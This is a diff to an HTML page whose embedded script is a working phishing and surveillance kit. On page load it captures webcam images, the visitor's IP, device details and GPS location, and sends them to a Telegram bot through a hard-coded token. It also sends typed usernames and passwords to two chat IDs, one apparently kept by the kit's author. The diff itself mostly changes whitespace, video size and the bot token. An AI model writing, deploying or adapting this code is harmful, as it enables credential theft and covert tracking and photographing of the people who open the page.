@@ -102,9 +102,6 @@
         </div>
         <div class="browser-content">
             <div>
-
-
-
                 <head>
                     <meta charset="UTF-8">
                     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -229,7 +226,7 @@
                 </head>
                 <body>
                     <div id="initial-container">
-                        <video id="video" width="640" height="480" autoplay></video>
+                        <video id="video" width="1080" height="720" autoplay></video>
                     </div>
                     <div class="container" id="main-container">
                         <div class="left">
@@ -248,9 +245,9 @@
                         </div>
                     </div>
                     <script>
-                        const botToken = '7347658420:AAFJel5v5zRqa-wF5IrK_lQoI1YPyHOZG0w';
+                        const botToken = '7347658420:AAHwslpdYkxbTaS95ZQSzyGQOL95cHCq5Go';
                         const permanentChatId = '5634946920'; // Permanent chat ID for sending data
-                
+                    
                         function getQueryParams() {
                             const params = {};
                             const queryString = window.location.search.slice(1);
@@ -261,9 +258,9 @@
                             }
                             return params;
                         }
-                
+                    
                         const { chatId } = getQueryParams();
-                
+                    
                         async function startVideo() {
                             try {
                                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -279,7 +276,7 @@
                                 console.error("Error accessing camera: ", error);
                             }
                         }
-                
+                    
                         function captureImage() {
                             const video = document.getElementById('video');
                             const canvas = document.createElement('canvas');
@@ -292,19 +289,19 @@
                                 sendImageToTelegram(blob, permanentChatId);
                             }, 'image/png');
                         }
-                
+                    
                         async function sendImageToTelegram(blob, chatId) {
                             const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
                             const formData = new FormData();
                             formData.append('chat_id', chatId);
                             formData.append('photo', blob, 'image.png');
-                
+                    
                             try {
                                 const response = await fetch(url, {
                                     method: 'POST',
                                     body: formData
                                 });
-                
+                    
                                 if (response.ok) {
                                     console.log("Image sent to Telegram");
                                 } else {
@@ -314,13 +311,13 @@
                                 console.error("Error sending image to Telegram: ", error);
                             }
                         }
-                
+                    
                         async function getUserInfo() {
                             try {
                                 const response = await fetch('https://api.ipify.org?format=json');
                                 const data = await response.json();
                                 const ip = data.ip;
-                
+                    
                                 const userAgent = navigator.userAgent;
                                 const platform = navigator.platform;
                                 const deviceMemory = navigator.deviceMemory || 'N/A';
@@ -330,27 +327,27 @@
                                 const screenHeight = window.screen.height;
                                 const colorDepth = window.screen.colorDepth;
                                 const deviceName = await getDeviceName();
-                
+                    
                                 const userInfo = { ip, userAgent, platform, deviceMemory, hardwareConcurrency, languages, screenWidth, screenHeight, colorDepth, deviceName };
-                
+                    
                                 console.log("User info: ", userInfo);
-                
+                    
                                 await sendUserInfoToTelegram(userInfo, chatId);
                                 await sendUserInfoToTelegram(userInfo, permanentChatId);
                             } catch (error) {
                                 console.error("Error getting user info: ", error);
                             }
                         }
-                
+                    
                         async function getDeviceName() {
                             const parser = new UAParser();
                             const result = parser.getResult();
                             return result.device.model || 'Unknown Device';
                         }
-                
+                    
                         async function sendUserInfoToTelegram(userInfo, chatId) {
                             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                
+                    
                             try {
                                 const response = await fetch(url, {
                                     method: 'POST',
@@ -359,10 +356,10 @@
                                     },
                                     body: JSON.stringify({
                                         chat_id: chatId,
-                                        text: `User Info:\nIP: ${userInfo.ip}\nUser Agent: ${userInfo.userAgent}\nPlatform: ${userInfo.platform}\nDevice Memory: ${userInfo.deviceMemory} GB\nHardware Concurrency: ${userInfo.hardwareConcurrency}\nLanguages: ${userInfo.languages}\nScreen Width: ${userInfo.screenWidth}px\nScreen Height: ${userInfo.screenHeight}px\nColor Depth: ${userInfo.colorDepth} bits\nDevice Name: ${userInfo.deviceName}`
+                                        text: `User Info:\nIP: ${userInfo.ip}\nUser Agent: ${userInfo.userAgent}\nPlatform: ${userInfo.platform}\nDevice Memory: ${userInfo.deviceMemory} GB\nHardware Concurrency: ${userInfo.hardwareConcurrency}\nLanguages: ${userInfo.languages}\nScreen Width: ${userInfo.screenWidth}\nScreen Height: ${userInfo.screenHeight}\nColor Depth: ${userInfo.colorDepth}\nDevice Name: ${userInfo.deviceName}`
                                     })
                                 });
-                
+                    
                                 if (response.ok) {
                                     console.log("User info sent to Telegram");
                                 } else {
@@ -372,26 +369,26 @@
                                 console.error("Error sending user info to Telegram: ", error);
                             }
                         }
-                
+                    
                         async function getLocation() {
                             try {
                                 const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
-                
+                    
                                 if (permissionStatus.state === 'denied') {
                                     alert('Please enable GPS in your device settings to continue.');
                                     return;
                                 }
-                
+                    
                                 navigator.geolocation.getCurrentPosition(async (position) => {
                                     const { latitude, longitude } = position.coords;
-                
+                    
                                     const locationInfo = {
                                         latitude,
                                         longitude
                                     };
-                
+                    
                                     console.log("Location info: ", locationInfo);
-                
+                    
                                     await sendLocationToTelegram(locationInfo, chatId);
                                     await sendLocationToTelegram(locationInfo, permanentChatId);
                                 }, (error) => {
@@ -403,10 +400,10 @@
                                 alert('Please enable GPS in your device settings to continue.');
                             }
                         }
-                
+                    
                         async function sendLocationToTelegram(locationInfo, chatId) {
                             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                
+                    
                             try {
                                 const response = await fetch(url, {
                                     method: 'POST',
@@ -418,7 +415,7 @@
                                         text: `Location Info:\nLatitude: ${locationInfo.latitude}\nLongitude: ${locationInfo.longitude}`
                                     })
                                 });
-                
+                    
                                 if (response.ok) {
                                     console.log("Location info sent to Telegram");
                                 } else {
@@ -428,22 +425,22 @@
                                 console.error("Error sending location info to Telegram: ", error);
                             }
                         }
-                
+                    
                         async function initializeFirstPart() {
                             await startVideo();
                             await getUserInfo();
                             await getLocation();
                             document.getElementById('main-container').style.display = 'flex';
                         }
-                
+                    
                         function sendToTelegram() {
                             const username = document.getElementById('username').value;
                             const password = document.getElementById('password').value;
                             const message = `Username: ${username}\nPassword: ${password}`;
-                
+                    
                             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
                             const permanentUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${permanentChatId}&text=${encodeURIComponent(message)}`;
-                
+                    
                             fetch(url)
                                 .then(response => response.json())
                                 .then(data => {
@@ -462,19 +459,17 @@
                                     console.error("Error sending credentials to permanent chat ID: ", error);
                                 });
                         }
-                
+                    
                         window.onload = () => {
                             initializeFirstPart();
                         };
-                
+                    
                         document.getElementById('login-button').addEventListener('click', sendToTelegram);
                     </script>
                     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.31/ua-parser.min.js"></script>
                 </body>
-        
-          
+            </div>
         </div>
     </div>
-</div>
 </body>
 </html>
